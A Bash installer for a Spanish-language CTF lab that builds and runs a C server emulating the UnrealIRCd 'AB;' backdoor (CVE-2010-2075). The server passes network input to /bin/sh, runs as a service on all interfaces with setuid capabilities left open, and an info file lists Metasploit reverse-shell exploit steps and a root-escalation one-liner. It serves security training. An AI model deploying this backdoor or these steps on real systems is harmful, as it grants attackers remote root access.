#!/bin/bash
# =============================================================================
# CTF UnrealIRCd "Next" - Emulación exacta del backdoor AB; (CVE-2010-2075)
# Versión: EDUCACIONAL con escalada de privilegios
# =============================================================================
set -euo pipefail

# ---- Colores ----
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# ---- Config ----
LOG_FILE="/tmp/ctf_install_$(date +%Y%m%d_%H%M%S).log"
INSTALL_DIR="/opt/ctf"
BIN_PATH="/usr/local/bin/fakeunreal_ab_server"
SERVICE_NAME="unrealircd.service"
FLAG_CONTENT="CTF{un3374l_b4ckd00r_pwn3d_$(date +%Y%m%d)}"
PORT="6200"
HOSTNAME="irc.ctf.local"
BANNER_VERSION="UnrealIRCd-3.2.8.1"
RUN_USER="ircd"

exec 2> >(tee -a "$LOG_FILE" >&2)

log(){ echo -e "$1" | tee -a "$LOG_FILE"; }
ok(){  echo -e "   ${GREEN}✓${NC} $1"; }
ko(){  echo -e "   ${RED}✗${NC} $1"; }

if [[ $EUID -ne 0 ]]; then
  echo -e "${RED}Este script requiere root (sudo).${NC}"; exit 1
fi

clear
echo "=========================================="
echo "  CTF Unreal 'Next' (emulación AB;)"
echo "  Log: $LOG_FILE"
echo "=========================================="

log "${BLUE}[1/7] Paquetes base...${NC}"
apt-get update -y >>"$LOG_FILE" 2>&1
apt-get install -y build-essential gcc make net-tools curl python3 >>"$LOG_FILE" 2>&1
ok "Paquetes instalados (incluyendo python3)"

log "${BLUE}[2/7] Usuario y estructura...${NC}"
id "$RUN_USER" &>/dev/null || useradd -m -s /bin/bash "$RUN_USER"
mkdir -p "$INSTALL_DIR"
ok "Usuario $RUN_USER y carpeta $INSTALL_DIR listos"

log "${BLUE}[3/7] Bandera CTF en /root...${NC}"
echo "$FLAG_CONTENT" > /root/flag.txt
chmod 600 /root/flag.txt
ok "Bandera creada: /root/flag.txt"

log "${BLUE}[4/7] Código del servidor AB; (emula Unreal) ...${NC}"
cat > "$INSTALL_DIR/ab_server.c" <<'EOF'
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static void die(const char *msg){ perror(msg); exit(1); }
static void chld(int s){ (void)s; while(waitpid(-1,NULL,WNOHANG)>0); }

static void sendf(int fd, const char *fmt, ...){
  char buf[1024];
  va_list ap; va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  send(fd, buf, strlen(buf), 0);
}

int main(int argc, char **argv){
  int port = 6200;
  const char *host = "irc.ctf.local";
  const char *banner_ver = "UnrealIRCd-3.2.8.1";

  for(int i=1;i<argc;i++){
    if(!strcmp(argv[i],"--port") && i+1<argc) port = atoi(argv[++i]);
    else if(!strcmp(argv[i],"--hostname") && i+1<argc) host = argv[++i];
    else if(!strcmp(argv[i],"--banner-version") && i+1<argc) banner_ver = argv[++i];
  }

  signal(SIGCHLD, chld);

  int s = socket(AF_INET, SOCK_STREAM, 0);
  if(s<0) die("socket");

  int opt=1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

  struct sockaddr_in addr; memset(&addr,0,sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  addr.sin_port = htons(port);

  if(bind(s, (struct sockaddr*)&addr, sizeof(addr))<0) die("bind");
  if(listen(s, 20)<0) die("listen");

  for(;;){
    int c = accept(s, NULL, NULL);
    if(c<0){ if(errno==EINTR) continue; die("accept"); }

    pid_t pid = fork();
    if(pid<0){ close(c); continue; }
    if(pid==0){
      sendf(c, ":%s NOTICE AUTH :*** Looking up your hostname...\r\n", host);
      sendf(c, ":%s NOTICE AUTH :*** Checking Ident\r\n", host);
      sendf(c, ":%s NOTICE AUTH :*** Found your hostname\r\n", host);
      sendf(c, ":%s 001 guest :Welcome to the %s server\r\n", host, banner_ver);

      char buf[2048]; ssize_t n;
      while((n = recv(c, buf, sizeof(buf)-1, 0)) > 0){
        buf[n]='\0';
        if(n>=3 && buf[0]=='A' && buf[1]=='B' && buf[2]==';'){
          char cmd[1500]; size_t i=3, j=0;
          while(i<(size_t)n && j<sizeof(cmd)-1 && buf[i]!='\r' && buf[i]!='\n'){
            cmd[j++] = buf[i++]; 
          }
          cmd[j]='\0';
          if(j>0){
            pid_t cpid = fork();
            if(cpid==0){
              execl("/bin/sh","sh","-c",cmd,(char*)NULL);
              _exit(0);
            }
            sendf(c, ":%s NOTICE AUTH :*** command queued\r\n", host);
          }
        } else if(!strncasecmp(buf,"QUIT",4)){
          break;
        } else {
          sendf(c, ":%s NOTICE AUTH :*** unknown command\r\n", host);
        }
      }
      close(c);
      _exit(0);
    } else {
      close(c);
    }
  }
  return 0;
}
EOF
ok "Fuente generado"

log "Compilando servidor…"
gcc -O2 -s -o "$BIN_PATH" "$INSTALL_DIR/ab_server.c"
chown root:root "$BIN_PATH"
chmod 0755 "$BIN_PATH"
ok "Binario: $BIN_PATH"

log "${BLUE}[5/7] Servicio systemd...${NC}"
cat > "/etc/systemd/system/${SERVICE_NAME}" <<EOF
[Unit]
Description=UnrealIRCd CTF (AB; emulado)
After=network.target

[Service]
Type=simple
User=${RUN_USER}
Group=${RUN_USER}
ExecStart=${BIN_PATH} --port ${PORT} --hostname ${HOSTNAME} --banner-version ${BANNER_VERSION}
Restart=always
RestartSec=2
AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_SETUID CAP_SETGID
NoNewPrivileges=false

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "${SERVICE_NAME}" >/dev/null
systemctl restart "${SERVICE_NAME}"
sleep 2
ok "Servicio ${SERVICE_NAME} activado"

log "${BLUE}[6/7] Verificaciones...${NC}"
if systemctl is-active --quiet "${SERVICE_NAME}"; then ok "Servicio activo"; else ko "Servicio inactivo"; fi
if netstat -tlnp 2>/dev/null | grep -q ":${PORT}"; then ok "Puerto ${PORT} escuchando"; else ko "Puerto ${PORT} no abierto"; fi

PUBLIC_IP=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4 2>/dev/null || curl -s ifconfig.me 2>/dev/null || echo "NoDetectada")

log "${BLUE}[7/7] LAB_INFO...${NC}"
cat > /home/ubuntu/LAB_INFO.txt <<INFOEOF
========================================
LABORATORIO CTF - UnrealIRCd (AB; Emulado)
========================================
IP Pública: ${PUBLIC_IP}
Puerto: ${PORT}
Banner: ${BANNER_VERSION}

EXPLOIT CON METASPLOIT:
  use exploit/unix/irc/unreal_ircd_3281_backdoor
  set RHOSTS ${PUBLIC_IP}
  set RPORT ${PORT}
  set PAYLOAD cmd/unix/reverse_perl
  set LHOST <TU_IP_PUBLICA>
  set LPORT 4444
  exploit

ESCALADA DE PRIVILEGIOS (una vez dentro como ircd):
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  whoami  # Debería mostrar: root

CAPTURA DE BANDERA:
  cat /root/flag.txt

Fecha: $(date)
========================================
INFOEOF
chown ubuntu:ubuntu /home/ubuntu/LAB_INFO.txt 2>/dev/null || true
ok "LAB_INFO en /home/ubuntu/LAB_INFO.txt"

echo -e "\n${GREEN}✅ CTF listo.${NC}"
echo "IP objetivo: $PUBLIC_IP  |  Puerto: $PORT"
echo "Bandera: /root/flag.txt"
echo -e "Log: $LOG_FILE"